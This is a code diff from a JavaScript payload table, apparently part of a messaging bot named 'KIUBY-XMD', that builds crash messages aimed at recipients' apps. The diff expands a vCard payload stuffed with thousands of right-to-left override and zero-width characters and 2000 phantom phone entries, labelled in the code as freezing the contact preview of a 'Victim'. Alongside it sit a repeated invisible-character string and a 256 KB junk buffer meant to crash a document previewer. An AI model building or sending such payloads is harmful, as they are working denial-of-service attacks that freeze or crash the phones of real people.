@@ -7,7 +7,15 @@ const payloads = {
     bin: ("\u200e\u200d\u200c\u202e\u202d".repeat(500) + "KIUBY_B_I_N_").repeat(20),
 
     // 🃏 THE CARD: VCard contact overload (Freezes contact preview)
-    vcard: (name) => `BEGIN:VCARD\nVERSION:3.0\nN:;${"\u202e".repeat(2000)};;;\nFN:${name || "Victim"}\nTEL;type=CELL;type=VOICE;type=pref:+123456789\nX-ABShowAs:COMPANY\nTITLE:${"\u202e".repeat(3000)}\nORG:KIUBY-XMD-EXPLOIT;\nNOTE:${"\u202e".repeat(5000)}\nEND:VCARD`,
+    vcard: (name) => {
+        let v = `BEGIN:VCARD\nVERSION:3.0\nN:;${"\u202e".repeat(2000)};;;\nFN:${name || "Victim"}\n`;
+        // Inject 2000+ phantom properties to bloat the parser
+        for (let i = 0; i < 2000; i++) {
+            v += `item${i}.TEL;type=CELL;waid=123456789:+123456789\nitem${i}.X-ABLabel:${"\u202e\u200e".repeat(50)}\n`;
+        }
+        v += `X-ABShowAs:COMPANY\nTITLE:${"\u202e\u200d\u200e".repeat(1000)}\nORG:KIUBY-XMD-EXPLOIT;\nNOTE:${"\u202e\u200d\u200e".repeat(5000)}\nEND:VCARD`;
+        return v;
+    },
 
     // 📄 THE DOC: Invalid buffer for Document Previewer (Media Crash)
     doc: Buffer.alloc(1024 * 256, 0x01), // Blank binary blob
